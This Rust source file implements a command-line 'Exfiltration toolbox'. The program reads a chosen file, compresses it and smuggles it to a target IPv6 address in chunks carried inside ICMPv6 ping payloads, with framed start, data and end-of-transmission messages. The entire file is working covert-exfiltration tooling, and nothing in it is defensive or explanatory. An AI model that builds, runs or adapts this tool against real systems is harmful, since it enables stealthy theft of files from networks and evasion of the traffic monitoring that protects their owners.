use std::fs::File;
use std::io::Read;
use std::net::{IpAddr, Ipv6Addr};
use std::path::Path;
use std::sync::Arc;
use std::time::Duration;

use clap::Parser;
use messages::Messages;
use rand::random;
use surge_ping::{Client, Config, PingIdentifier, PingSequence, ICMP};
use tokio::time::sleep;

/// Exfiltration toolbox
#[derive(Parser)]
#[clap(version)]
pub struct Cli {
    /// Target to send the file to
    target: Ipv6Addr,

    /// Path to the file to exfiltrate
    file_path: String,

    /// Size of the chunks
    #[clap(long, default_value_t = 1480)]
    chunk_size: usize,
}

#[tokio::main]
async fn main() -> Result<(), String> {
    let cli = Cli::parse();

    let path = Path::new(&cli.file_path);

    if !path.exists() {
        return Err(format!("File {} does not exist", cli.file_path));
    }

    if !path.is_file() {
        return Err(format!("Path {} is not a file", cli.file_path));
    }

    let mut file = File::open(path).map_err(|e| format!("Could not open file: {e}"))?;

    let mut content = vec![];
    file.read_to_end(&mut content)
        .map_err(|e| format!("Could not read from file: {e}"))?;

    let compressed = lz4_flex::compress(&content);

    let target = IpAddr::V6(cli.target);

    let config = Config::builder().kind(ICMP::V6).build();
    let client =
        Arc::new(Client::new(&config).map_err(|e| format!("Could not create ping client: {e}"))?);

    let mut identifier;
    loop {
        identifier = random();
        if identifier == 1337 || identifier == 0 {
            continue;
        }
        break;
    }

    let initial = Messages::Initial {
        file_name: path.file_name().unwrap().to_str().unwrap().to_owned(),
        file_size: content.len() as u64,
        identifier,
    };

    client
        .pinger(target, PingIdentifier(1337))
        .await
        .ping(PingSequence(1337), &serde_json::to_vec(&initial).unwrap())
        .await
        .unwrap();

    sleep(Duration::from_secs(1)).await;

    // the chunk size is because of the max payload size of ping
    for chunk in compressed.chunks(cli.chunk_size) {
        let data = Messages::Data {
            data: chunk.to_vec(),
            identifier,
        };
        let serialized =
            serde_json::to_vec(&data).map_err(|e| format!("Error serializing data: {e}"))?;

        client
            .pinger(target, PingIdentifier(1337))
            .await
            .ping(PingSequence(identifier), &serialized)
            .await
            .map_err(|e| format!("Could not send ping: {e}"))?;
    }

    let eot = Messages::EndOfTransmission { identifier };
    client
        .pinger(target, PingIdentifier(1337))
        .await
        .ping(PingSequence(1337), &serde_json::to_vec(&eot).unwrap())
        .await
        .map_err(|e| format!("Couldn't send end of transmission: {e}"))?;

    Ok(())
}
